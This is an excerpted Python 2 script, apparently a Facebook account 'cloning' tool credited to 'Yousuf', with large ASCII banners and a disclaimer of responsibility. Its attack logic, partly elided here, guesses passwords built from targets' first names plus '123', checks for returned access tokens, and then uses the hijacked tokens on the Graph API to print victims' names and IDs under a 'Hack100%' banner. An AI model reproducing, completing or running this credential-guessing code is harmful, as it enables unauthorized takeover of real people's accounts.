...
🇾​​​​​🇴​​​​​🇺​​​​​🇸​​​​​🇺​​​​​🇫​​​​​
 ...
 ♨️°───────(YOUSUF---JD)───────°♨️ 
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
\033[1;96m║✯ Creator ✯ Yousuf---          ║ 

\033[1;92m║✯ Instagram ✯ Yousuf----       ║    

\033[1;94m║✯ Channel  ✯ Yousuf            ║   

\033[1;97m║✯ Channel ✯ JD                 ║ 

\033[1;91m║✯ Facebook ✯ Yousuf            ║ 
\033[1;96m║✯ Iska Galat Istimal Na Kren    ║
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
print  """
\033[1;97m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR Yousuf ~
\033[1;97m************************************************

\033[1;96m
\033[1;96m█▄█ █▀█ █░█ █▀ █░█ █▀▀
\033[1;96m░█░ █▄█ █▄█ ▄█ █▄█ █▀
 Enjoy Karo Yousuf Ke Hoty Howy😎⚡😎
 🔥Jo Marzi karlo Tum Yousuf Nahin Ban sakte🔥
"""
...
def login():
	...
	try:
		...
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[⚡] \x1b[1;91m───Only Login your new ID───\x1b[1;93m[⚡]' )
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\033[1;91mLagta Ha Apki Id.Checkpoint Par Ha"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
...
def pilih():
	...
	if unikers =="":
		...
		os.system('clear')
		print logo
		print " \033[1;36;40m◄══════════════════YousufAlzafjali══════════════════►\n"
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mYousufAlzadjali\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mYousufAlzadjali\033[1;95m◈•══════•◈•"
		try:
	...
	jalan('          \033[1;91mYousuf start cloning Wait...')
	print  "  \033[1;92m ◄══════════════════Yousuf_JD══════════════════►" 
				    ...
				    pass2 = b['first_name'] + '123'										
			            ...
			            if 'access_token' in q:	
					       ...
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;94m[  ✓  ] \x1b[1;92mJD-Hack100%'								
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']									
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user							
	...
	print "  \033[1;91m«---•◈•---Developed By Muhamad-Yousuf--•◈•---»" #Dev:Asim-Ch
...
                 ┈┈┈╰╯┈┈╰╯┈┈┈
         ...
         Checkpoint ID Open After 3-5 Days
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..Yousuf Alzadjali Hackers.. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Instagram
              \033[1;91mYousuf"""
